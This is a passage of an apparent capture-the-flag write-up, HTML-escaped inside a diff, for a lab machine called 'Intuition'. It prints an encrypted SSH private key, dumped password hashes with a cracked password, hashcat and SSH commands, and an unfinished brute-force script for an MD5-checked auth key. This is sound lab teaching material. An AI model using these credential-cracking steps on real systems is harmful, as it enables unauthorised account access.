+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-----BEGIN OPENSSH PRIVATE KEY-----
+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
+XxwXArPr6+HQe9hZSjI2hjYC2OU=
+-----END OPENSSH PRIVATE KEY-----
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We can use the key-phrase and this key with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH-KEYGEN&lt;/code&gt; to generate a key to SSH into the machine for our true foothold.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;-ssh-key&quot;&gt;&lt;i class=&quot;fa-solid fa-desktop&quot; style=&quot;color: #b197fc;&quot;&gt;&lt;/i&gt; SSH Key:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Now save the key to a file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsaIntuition&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_SSH_Key_Gen.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Then we want to decrypt the key with the old key and overwrite the passphrase. I left it blank for no password.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh-keygen -p -f id_rsaIntuition&lt;/code&gt;&lt;br /&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Username:&lt;/strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt; dev_acc@local&lt;/code&gt; - A note is left on the key that mentions &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dev_acc@local&lt;/code&gt;.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-explosion&quot; style=&quot;color: #aec07c;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod 600&lt;/code&gt; on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; to change file permissions for use in ssh.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -i id_rsa dev_acc@comprezzor.htb&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Dev_Acc_SSH_USER_PWN.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;-recon-1&quot;&gt;&lt;i class=&quot;fa-solid fa-feather-pointed&quot; style=&quot;color: #aec07c;&quot;&gt;&lt;/i&gt; Recon:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Quick checks&lt;/strong&gt;
+    &lt;ul&gt;
+      &lt;li&gt;Current Directory &lt;mark&gt;~/dev_acc/&lt;/mark&gt;&lt;/li&gt;
+      &lt;li&gt;Need password for Sudo -l access&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;directory-enumeration&quot;&gt;Directory Enumeration&lt;/h3&gt;
+&lt;ul&gt;
+  &lt;li&gt;Lets check the &lt;mark&gt;`var/www/app`&lt;/mark&gt; directory where the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.py&lt;/code&gt; files are located that we where abusing for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lfi&lt;/code&gt; earlier.&lt;/li&gt;
+  &lt;li&gt;Theres a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.db&lt;/code&gt; located under &lt;mark&gt;`/var/www/app/blueprints/auth`&lt;/mark&gt; that looks like its dedicated to the users.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;users.db&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Cat out the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;users.db&lt;/code&gt; file and we find some hashes.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�3�EtableusersusersCREATE TABLE users (
+    id INTEGER PRIMARY KEY AUTOINCREMENT,
+    username TEXT NOT NULL UNIQUE,
+    password TEXT NOT NULL,
+    role TEXT DEFAULT &apos;user&apos;
+=adamsha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43webdevh�=adminsha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606admin
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlite&lt;/code&gt; is installed on the box lets open the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;users.db&lt;/code&gt;.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sqlite users.db&lt;/code&gt;&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-frog&quot; style=&quot;color: #b8bb26;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Select * from users;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Usersdb_hashes.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We dump two hashes for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adam&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1|admin|sha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606|admin
+2|adam|sha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43|webdev
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Dumping &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adams&lt;/code&gt; hash we can crack it with hashcat.&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-explosion&quot; style=&quot;color: #aec07c;&quot;&gt;&lt;/i&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hashcat -m 1460 -a 0 hash1 /usr/share/wordlists/rockyou.txt &lt;/code&gt;&lt;br /&gt;
+  &lt;i class=&quot;fa-solid fa-seedling fa-lg&quot; style=&quot;color: #98971a&quot;&gt;&lt;/i&gt;  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43:Z7bcBO9P43gvdQWp:adam gray&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;We can connect to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt; with our foothold on the machine using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adam : adam gray&lt;/code&gt; account/creds.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Adam_FTP.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Inspecting the directories we find a backup of an application called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runner1&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Runner1_FTP_Backup.png&quot; /&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get&lt;/code&gt; all three files from the ftp server.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Catting out the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;run-tests.sh&lt;/code&gt; script we see that it appears to be a script that runs an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ansible playbook&lt;/code&gt; to install roles.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/bin/bash
+
+# List playbooks
+./runner1 list
+
+# Run playbooks [Need authentication]
+# ./runner run [playbook number] -a [auth code]
+#./runner1 run 1 -a &quot;UHI75GHI****&quot;
+
+# Install roles [Need authentication]
+# ./runner install [role url] -a [auth code]
+#./runner1 install http://role.host.tld/role.tar -a &quot;UHI75GHI****&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;This will probably be our attack path. But right now with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dev_acc&lt;/code&gt; Im not seeing any possible way to exploit this at the moment.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Catting out &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runner1.c&lt;/code&gt; or Reverse Engineering the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runner&lt;/code&gt; app with ghidra we can see that there is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check_auth&lt;/code&gt; function  crafted in the app which checks the provided &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_key&lt;/code&gt; from the script to ensure the hashes match before running the playbook.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/box-images/Intuition/Intuition_Reverse_Auth_Key.png&quot; /&gt;&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;c1&quot;&gt;#define INVENTORY_FILE &quot;/opt/playbooks/inventory.ini&quot;
+#define PLAYBOOK_LOCATION &quot;/opt/playbooks/&quot;
+#define ANSIBLE_PLAYBOOK_BIN &quot;/usr/bin/ansible-playbook&quot;
+#define ANSIBLE_GALAXY_BIN &quot;/usr/bin/ansible-galaxy&quot;
+#define AUTH_KEY_HASH &quot;0feda17076d793c2ef2870d7427ad4ed&quot;
+&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;check_auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;auth_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MD5_DIGEST_LENGTH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;nc&quot;&gt;MD5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;auth_key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;md5_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;for &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;sprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;md5_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%02x&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nf&quot;&gt;if &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;md5_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AUTH_KEY_HASH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Valid Hash: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0feda17076d793c2ef2870d7427ad4ed&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Knowing the required &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hash&lt;/code&gt; value and having half of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_key=&quot;UHI75GHI****&quot;&lt;/code&gt; we can attempt to brute-force out the password.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;auth-key-brute-force&quot;&gt;Auth Key Brute-force:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Below is a python script that will check random strings until we get a match of hash values then print out the password that created the matching hash value.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;itertools&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;product&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Define the partial string and target hash
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;partial_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;UHI75GHI&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;target_hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;0feda17076d793c2ef2870d7427ad4ed&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Define the length and characters for the missing part
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;missing_length&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ascii_uppercase&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;# Adjust as needed
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# Function to compute MD5 hash
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;md5_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hashlib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;hexdigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# Brute-force to find the complete string
+&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;combination&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;product&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;repeat&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;missing_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;guess&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;partial_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;combination&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;md5_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;guess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target_hash&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
